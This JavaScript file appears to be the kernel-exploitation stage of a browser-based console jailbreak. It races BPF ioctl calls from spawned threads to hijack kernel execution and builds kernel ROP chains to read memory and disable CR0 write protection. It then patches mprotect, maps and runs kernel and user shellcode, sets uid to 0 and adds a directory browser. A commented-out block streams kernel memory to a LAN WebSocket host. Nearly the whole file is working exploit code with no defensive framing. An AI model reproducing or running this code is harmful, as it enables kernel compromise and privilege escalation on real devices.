function stage4_()
{
    function malloc(sz)
    {
        var backing = new Uint8Array(1000+sz);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }
    function malloc32(sz)
    {
        var backing = new Uint8Array(0x1000+sz*4);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = new Uint32Array(backing.buffer);
        return ptr;
    }
    var strcpy_helper = new Uint8Array(0x1000);
    var where_writeptr_strcpy = p.leakval(strcpy_helper).add32(0x10);
    function strcpy(ptr, str)
    {
        p.write8(where_writeptr_strcpy, ptr);
        for (var i = 0; i < str.length; i++)
            strcpy_helper[i] = str.charCodeAt(i) & 0xFF;
        strcpy_helper[str.length] = 0;
    }
    
    
    var sysctlbyname = window.libKernelBase.add32(0xF290);
    var sysreq = malloc32(0x10);
    sysreq.backing[0] = 7;
    sysreq.backing[1] = 0;
    sysreq.backing[4] = 0x10;
    
    var retv = malloc(0x100);
    var __errno_ptr = p.fcall(window.libKernelBase.add32(0x2BE0));
    
    
    var rv = p.fcall(sysctlbyname, p.sptr("machdep.openpsid"), retv, sysreq.add32(0x10), 0, 0);
    
    var str = "";
    for (var i=0; i<0x10; i++)
    {
        str += zeroFill(retv.backing[i].toString(16),2) + " ";
    }
    
   // log("psid: " + str)
    
    var fd = p.syscall("open", p.sptr("/dev/bpf0"), 2).low;
    var fd1 = p.syscall("open", p.sptr("/dev/bpf0"), 2).low;
    if (fd == (-1 >>> 0))
    {
        print("kexp failed: no bpf0");
    }
//    print("fd: " + fd);
    
    var scratch = malloc(0x100);
    var ifname = malloc(0x10);
    strcpy(ifname, "wlan0");
    p.syscall("ioctl", fd, 0x8020426c, ifname);
    var ret = p.syscall("write", fd, scratch, 40);
    if (ret.low == (-1 >>> 0))
    {
        strcpy(ifname, "eth0");
        p.syscall("ioctl", fd, 0x8020426c, ifname);
        var ret = p.syscall("write", fd, scratch, 40);
        if (ret.low == (-1 >>> 0))
        {
            throw "kexp failed :(";
        }
    }
    
    var assertcnt = 0;
    var assert = function(x)
    {
        assertcnt++;
        if (!x) throw "assertion " + assertcnt + " failed";
    }

    print("got it");
    
    var bpf_valid = malloc32(0x4000);
    var bpf_valid_u32 = bpf_valid.backing;
    var bpf_valid_prog = malloc(0x40);
    p.write8(bpf_valid_prog, 64)
    p.write8(bpf_valid_prog.add32(8), bpf_valid)
    
    for (var i = 0 ; i < 0x4000; )
    {
        bpf_valid_u32[i++] = 6; // BPF_RET
        bpf_valid_u32[i++] = 0;
    }
    
    var bpf_invalid = malloc32(0x4000);
    var bpf_invalid_u32 = bpf_invalid.backing;
    var bpf_invalid_prog = malloc(0x40);
    p.write8(bpf_invalid_prog, 64)
    p.write8(bpf_invalid_prog.add32(8), bpf_invalid)
    
    for (var i = 0 ; i < 0x4000; )
    {
        bpf_invalid_u32[i++] = 4; // NOP
        bpf_invalid_u32[i++] = 0;
    }
    
    var push_bpf = function(bpfbuf, cmd, k)
    {
        var i = bpfbuf.i;
        if (!i) i=0;
        bpfbuf[i*2] = cmd;
        bpfbuf[i*2+1] = k;
        bpfbuf.i = i+1;
    }
    
    push_bpf(bpf_invalid_u32, 5, 2); // jump
    push_bpf(bpf_invalid_u32, 0x12, 0); // invalid opcode
    bpf_invalid_u32.i = 16;

    var bpf_write8imm = function(bpf, offset, imm)
    {
        if (!(imm instanceof int64))
        {
            imm = new int64(imm,0);
        }
        push_bpf(bpf, 0, imm.low); // BPF_LD|BPF_IMM
        push_bpf(bpf, 2, offset); // BPF_ST
        push_bpf(bpf, 0, imm.hi); // BPF_LD|BPF_IMM
        push_bpf(bpf, 2, offset+1); // BPF_ST -> RDI: pop rsp
    }
    
    var bpf_copy8 = function(bpf, offset_to, offset_from)
    {
        push_bpf(bpf, 0x60, offset_from); // BPF_LD|BPF_MEM
        push_bpf(bpf, 2, offset_to); // BPF_ST
        push_bpf(bpf, 0x60, offset_from+1); // BPF_LD|BPF_MEM
        push_bpf(bpf, 2, offset_to+1); // BPF_ST
    }
    var bpf_add4 = function(bpf, offset, val)
    {
        push_bpf(bpf, 0x60, offset); // BPF_LD
        push_bpf(bpf, 0x4, val); // BPF_ALU|BPF_ADD|BPF_K
        push_bpf(bpf, 2, offset); // BPF_ST
    }
    
    
    
    var krop_off_init = 0x1e;
    var krop_off = krop_off_init;
    var reset_krop = function() {
        krop_off = krop_off_init;
        bpf_invalid_u32.i = 16;
    }
    var push_krop = function(value)
    {
        bpf_write8imm(bpf_invalid_u32, krop_off, value);
        krop_off += 2;
    }
    var push_krop_fromoff = function(value)
    {
        bpf_copy8(bpf_invalid_u32, krop_off, value);
        krop_off += 2;
    }
    var finalize_krop = function(retv)
    {
        if(!retv) retv = 5;
        push_bpf(bpf_invalid_u32, 6, retv); // return 5
    }

    var rtv = p.syscall("ioctl", fd, 0x8010427B, bpf_valid_prog);
    assert(rtv.low == 0);
    
    rtv = p.syscall("write", fd, scratch, 40);
    assert(rtv.low == (-1 >>> 0));
    
    var kscratch = malloc32(0x80);
    
    var kchain = new window.RopChain();
    
    kchain.clear();
    kchain.push(window.gadgets["ret"]); 
    kchain.push(window.gadgets["ret"]); 
    kchain.push(window.gadgets["ret"]); 
    kchain.push(window.webKitBase.add32(0x3EBD0)); 

    reset_krop();
    //push_krop(window.gadgets["infloop"]); // 8
    bpf_copy8(bpf_invalid_u32, 0, 0x1e);
    push_krop(window.gadgets["pop rsi"]); // 0x10
    push_krop_fromoff(0);
    push_krop(window.gadgets["pop rsp"]);
    push_krop(kchain.ropframeptr); // 8

    finalize_krop(0);
    
    var spawnthread = function(chain) {
        
        /*
         
         
         seg000:00000000007FA7D0                         sub_7FA7D0      proc near               ; DATA XREF: sub_7F8330+5Eo
         seg000:00000000007FA7D0 55                                      push    rbp
         seg000:00000000007FA7D1 48 89 E5                                mov     rbp, rsp
         seg000:00000000007FA7D4 41 56                                   push    r14
         seg000:00000000007FA7D6 53                                      push    rbx
         seg000:00000000007FA7D7 48 89 F3                                mov     rbx, rsi
         seg000:00000000007FA7DA 49 89 FE                                mov     r14, rdi
         seg000:00000000007FA7DD 48 8D 35 E5 B3 EC 00                    lea     rsi, aMissingPlteBef ; "Missing PLTE before tRNS" < search this
         
         
         -> xref of sub_7FA7D0:
         
         
         seg000:00000000007F8380 48 8D 3D 28 D8 EC 00                    lea     rdi, a1_5_18_0  ; "1.5.18"
         seg000:00000000007F8387 48 8D 15 82 23 00 00                    lea     rdx, sub_7FA710
         seg000:00000000007F838E 48 8D 0D 3B 24 00 00                    lea     rcx, sub_7FA7D0
         seg000:00000000007F8395 31 F6                                   xor     esi, esi
         seg000:00000000007F8397 49 C7 47 20 00 00 00 00                 mov     qword ptr [r15+20h], 0
         seg000:00000000007F839F 66 41 C7 47 18 00 00                    mov     word ptr [r15+18h], 0
         seg000:00000000007F83A6 49 C7 47 10 00 00 00 00                 mov     qword ptr [r15+10h], 0
         seg000:00000000007F83AE E8 8D 3C D3 00                          call    sub_152C040
         
         -> code:
         
         m_png = png_create_read_struct(PNG_LIBPNG_VER_STRING, 0, decodingFailed, decodingWarning);
         
         
         decodingWarning -> sub_7FA7D0 (where Missing PLTE before tRNS is referenced)
         
         decodingFailed -> contains longjmp (which we want)
         
         seg000:00000000007FA710                         sub_7FA710      proc near               ; DATA XREF: sub_7F8330+57o
         seg000:00000000007FA710                                                                 ; sub_7F9DC0+2Eo
         seg000:00000000007FA710 55                                      push    rbp
         seg000:00000000007FA711 48 89 E5                                mov     rbp, rsp
         seg000:00000000007FA714 48 8B 35 5D B6 E5 02                    mov     rsi, cs:qword_3655D78
         seg000:00000000007FA71B BA 60 00 00 00                          mov     edx, 60h ; '`'
         seg000:00000000007FA720 E8 AB E6 D2 00                          call    sub_1528DD0
         seg000:00000000007FA725 BE 01 00 00 00                          mov     esi, 1
         seg000:00000000007FA72A 48 89 C7                                mov     rdi, rax
         seg000:00000000007FA72D E8 26 6D 80 FF                          call    sub_1458 < longjmp
         seg000:00000000007FA732 0F 0B                                   ud2
         seg000:00000000007FA732                         sub_7FA710      endp
         
         
         */
        var longjmp = webKitBase.add32(0x1458);
        
        
        // ThreadIdentifier createThread(ThreadFunction entryPoint, void* data, const char* name)
        /*
         seg000:00000000001DD17F 48 8D 15 C9 38 4C 01                    lea     rdx, aWebcoreGccontr ; "WebCore: GCController" < search this
         seg000:00000000001DD186 31 F6                                   xor     esi, esi
         seg000:00000000001DD188 E8 B3 1B F9 00                          call    sub_116ED40 < createThread
         */
        
        var createThread = window.webKitBase.add32(0x116ED40);
        
        var contextp = malloc32(0x2000);
        var contextz = contextp.backing;
        contextz[0] = 1337;
        
        var thread2 = new RopChain();
        thread2.clear();
        thread2.push(window.gadgets["ret"]); // nop
        thread2.push(window.gadgets["ret"]); // nop
        thread2.push(window.gadgets["ret"]); // nop
        thread2.push(window.gadgets["ret"]); // nop
        chain(thread2);
        
        p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget
        p.write8(contextp.add32(0x10), thread2.ropframeptr); // rsp
        
        p.fcall(createThread, longjmp, contextp, p.sptr("GottaGoFast"));
        
        window.nogc.push(contextz);
        window.nogc.push(thread2);
        
        return thread2;
    }
    
    var interrupt1 = 0;
    var interrupt2 = 0;
    // ioctl() with valid BPF program -> will trigger reallocation of BFP code alloc
    spawnthread(function(thread2){
                interrupt1 = thread2.ropframeptr;
                thread2.push(window.gadgets["pop rdi"]); // pop rdi
                thread2.push(fd); // what
                thread2.push(window.gadgets["pop rsi"]); // pop rsi
                thread2.push(0x8010427B); // what
                thread2.push(window.gadgets["pop rdx"]); // pop rdx
                thread2.push(bpf_valid_prog); // what
                thread2.push(window.gadgets["pop rsp"]); // pop rdx
                thread2.push(thread2.ropframeptr.add32(0x800)); // what
                thread2.count = 0x100;
                var cntr = thread2.count;
                thread2.push(window.syscalls[54]); // ioctl
                thread2.push_write8(thread2.ropframeptr.add32(cntr*8), window.syscalls[54]); // restore ioctl
                
                thread2.push(window.gadgets["pop rsp"]); // pop rdx
                thread2.push(thread2.ropframeptr); // what
                })
    
    // ioctl() with invalid BPF program -> this will be executed when triggering bug
    spawnthread(function(thread2){
                interrupt2 = thread2.ropframeptr;
                thread2.push(window.gadgets["pop rdi"]); // pop rdi
                thread2.push(fd1); // what
                thread2.push(window.gadgets["pop rsi"]); // pop rsi
                thread2.push(0x8010427B); // what
                thread2.push(window.gadgets["pop rdx"]); // pop rdx
                thread2.push(bpf_invalid_prog); // what
                thread2.push(window.gadgets["pop rsp"]); // pop rdx
                thread2.push(thread2.ropframeptr.add32(0x800)); // what
                thread2.count = 0x100;
                var cntr = thread2.count;
                thread2.push(window.syscalls[54]); // ioctl
                thread2.push_write8(thread2.ropframeptr.add32(cntr*8), window.syscalls[54]); // restore ioctl
                
                thread2.push(window.gadgets["pop rsp"]); // pop rdx
                thread2.push(thread2.ropframeptr); // what
                })

    function kernel_rop_run(cb)
    {
        kchain.clear();
        kchain.push(window.gadgets["ret"]); 
        kchain.push(window.gadgets["ret"]); 
        kchain.push(window.gadgets["ret"]); 
        kchain.push(window.gadgets["ret"]); 
        kchain.push(window.gadgets["ret"]); 
        kchain.push(window.gadgets["ret"]); 
        cb(kchain);
        kchain.push(window.gadgets["pop rax"]); 
        kchain.push(0); 
        kchain.push(window.gadgets["ret"]); 
        kchain.push(window.webKitBase.add32(0x3EBD0)); 
        while(1)
        {
            if (p.syscall(4, fd, scratch, 40).low == 40)
            {
                return p.read8(kscratch);
                break;
            }
        }
    }
    function leak_kern_rip() {
        return kernel_rop_run(function(kchain)
                              {
                              kchain.push(window.gadgets["pop rdi"]); 
                              kchain.push(kscratch); 
                              kchain.push(window.gadgets["mov [rdi], rsi"]); 
                              });
    }
    
    function kernel_read8(addr) {
        return kernel_rop_run(function(kchain)
                              {
                              kchain.push(window.gadgets["pop rdi"]); 
                              kchain.push(addr); 
                              kchain.push(window.webKitBase.add32(0x13A220)); // deref
                              kchain.push(window.gadgets["pop rdi"]); 
                              kchain.push(kscratch); 
                              kchain.push(window.gadgets["mov [rdi], rax"]); 
                              });
    }
    function kernel_memcpy(to,from,size) {
        return kernel_rop_run(function(kchain)
                              {
                              kchain.push(window.gadgets["pop rdi"]); 
                              kchain.push(to); 
                              kchain.push(window.gadgets["pop rsi"]); 
                              kchain.push(from); 
                              kchain.push(window.gadgets["pop rdx"]); 
                              kchain.push(size); 
                              kchain.push(window.gadgets["memcpy"]); 
                              kchain.push(window.gadgets["mov [rdi], rax"]); 
                              });
    }
    var kern_base = leak_kern_rip();
    kern_base.low &= 0xffffc000;
    kern_base.low -= 0x164000;
    log("ay! " + kernel_read8(kern_base) + " " + kern_base);
    
    /*
    var chunksz = 0x40000;
    var pagebuf = malloc(chunksz);
    
    connection = new WebSocket('ws://192.168.0.125:8080');
    connection.binaryType = "arraybuffer";
    connection.onmessage = function() {
        try {
            kernel_memcpy(pagebuf, kern_base, chunksz);
            connection.send(new Uint8Array(pagebuf.backing.buffer, 0, chunksz));
            kern_base.add32inplace(chunksz);
        }catch(e) {log(e);}
    }
     
     
     LOAD:FFFFFFFF9144CF70 0F 20 C0                                mov     rax, cr0
     LOAD:FFFFFFFF9144CF73 48 0D 2A 00 05 00                       or      rax, 5002Ah
     LOAD:FFFFFFFF9144CF79 0F 22 C0                                mov     cr0, rax
     LOAD:FFFFFFFF9144CF7C C3                                      retn
     FFFFFFFF91562A58
     */
    var getset_cr0 = kern_base.add32(0x280f70);
    var set_cr0 = kern_base.add32(0x280f79);
    
    function kernel_get_cr0() {
        return kernel_rop_run(function(kchain)
                              {
                              kchain.push(getset_cr0); 
                              kchain.push(window.gadgets["pop rdi"]); 
                              kchain.push(kscratch); 
                              kchain.push(window.gadgets["mov [rdi], rax"]); 
                              });
    }

    var cr0val = kernel_get_cr0();
    cr0val.low &= ((~(1 << 16)) >>> 0);
    log("cr0: " + cr0val);
    function kernel_write8_cr0(addr, val) {
        return kernel_rop_run(function(kchain)
                              {
                              kchain.push(window.gadgets["pop rax"]); 
                              kchain.push(cr0val); 
                              kchain.push(set_cr0);
                              kchain.push(window.gadgets["pop rdi"]); 
                              kchain.push(addr); 
                              kchain.push(window.gadgets["pop rax"]); 
                              kchain.push(val); 
                              kchain.push(window.gadgets["mov [rdi], rax"]);
                              kchain.push(getset_cr0);
                              });
    }
    function kernel_fcall(addr, arg0, arg1) {
        return kernel_rop_run(function(kchain)
                              {
                              if(arg0)
                              {
                                    kchain.push(window.gadgets["pop rdi"]);
                                    kchain.push(arg0);
                              }
                              if(arg1)
                              {
                                    kchain.push(window.gadgets["pop rsi"]);
                                    kchain.push(arg1);
                              }
                              kchain.push(addr);
                              
                              kchain.push(window.gadgets["pop rdi"]);
                              kchain.push(kscratch);
                              kchain.push(window.gadgets["mov [rdi], rax"]);
                              });
    }
    
    var mprotect_patchloc = kern_base.add32(0x396a58);
    var mprotect_patchbytes = kernel_read8(mprotect_patchloc);
    var mprotect_realbytes = mprotect_patchbytes;
    
    log("patchbytes: " + mprotect_patchbytes);
    mprotect_patchbytes.low = 0x90909090;
    mprotect_patchbytes.hi &= 0xffff0000;
    mprotect_patchbytes.hi |= 0x00009090;
    
    
    var shellsize = window.shellcode.byteLength;
    shellsize += 0x4000;
    shellsize &= 0xffffc000;
    
    var shellscratch_to = malloc32((0x10000 + shellsize)/4);
    
    var origin_to = shellscratch_to.low;
    shellscratch_to.low &= 0xffffc000;
    shellscratch_to.low += 0x8000;
    var offset = (shellscratch_to.low - origin_to) / 4;
    
    for (var i=0; i < window.shellcode.length; i++)
    {
        shellscratch_to.backing[i+offset] = window.shellcode[i];
    }
    
    
    kernel_write8_cr0(mprotect_patchloc,mprotect_patchbytes);
    var mapz = p.syscall("mprotect", shellscratch_to, shellsize, 7);
    kernel_write8_cr0(mprotect_patchloc,mprotect_realbytes);
    if (mapz.low != 0) throw "mprot fail!";

    faultme = shellscratch_to.add32(0x0);

    for (var i=0; i < window.shellcode.length; i+= 0x1000)
    {
        var bck = p.read8(faultme);
        p.write8(faultme, 0xc3)
        p.fcall(faultme); // test faulting
        p.write8(faultme, bck)
    }
    p.syscall("mlock", shellscratch_to, shellsize);
    var pyld_buf = p.read8(p.leakval(window.pyld).add32(0x10));

    var zarguments = malloc32(0x1000);
    p.write8(zarguments, kern_base);
    p.write8(zarguments.add32(8), fd_kcall);
    p.write8(zarguments.add32(16), interrupt1);
    p.write8(zarguments.add32(24), interrupt2);
    p.write8(zarguments.add32(32), window.syscalls[431]);
    p.write8(zarguments.add32(40), window.syscalls[591]);
    p.write8(zarguments.add32(48), window.syscalls[594]);
    p.write8(zarguments.add32(56), pyld_buf); // pyld
    p.write8(zarguments.add32(64), window.pyldpoint);
    p.write8(zarguments.add32(72), window.pyld.byteLength);

    var fd_kcall = p.syscall("open", p.sptr("/dev/bpf0"), 2).low;

    log(p.read8(shellscratch_to.add32(window.entrypoint)));
    log("kernel shellcode: " + kernel_fcall(shellscratch_to.add32(window.entrypoint), 1, zarguments));
    p.syscall("setuid", 0);
    log("uid: " + p.syscall("getuid"));
    alert("enter user");
    log("user shellcode: " + p.fcall(shellscratch_to.add32(window.entrypoint), 2, zarguments));

    var lsscrtch32 = new Uint32Array(0x400);
    var lsscrtch = p.read8(p.leakval(lsscrtch32).add32(0x10));
    window.ls = function(path)
    {
        var sep = "/"
        if (path[path.length-1]=="/") sep = "";
        
        var fd = p.syscall("open", p.sptr(path), 0x1100004).low;
        if (fd == (-1 >>> 0))
        {
            print("open("+path+"): -1");
            return;
        }
        
        alert("getdenv");
        
        print("Directory listing for " +path+":");
        var total = p.syscall("getdents", fd, lsscrtch, 0x1000).low;
        if (total == (-1 >>> 0))
        {
            print("getdents("+path+"): -1");
            return;
        }
        
        alert("got denv");
        
        var offset = 0;
        while (offset < total)
        {
            var cur = lsscrtch.add32(offset);
            var reclen = p.read4(cur.add32(4)) & 0xFFFF;
            var filepath = path + sep + p.readstr(cur.add32(8));
            print("<a href=javascript:window.ls('" + filepath + "');>" + filepath + "</a>");
            offset += reclen;
            if(!reclen) break;
        }
        p.syscall("close", fd);
    }
    print("<a href=javascript:window.ls('/');>ls /</a>");

}

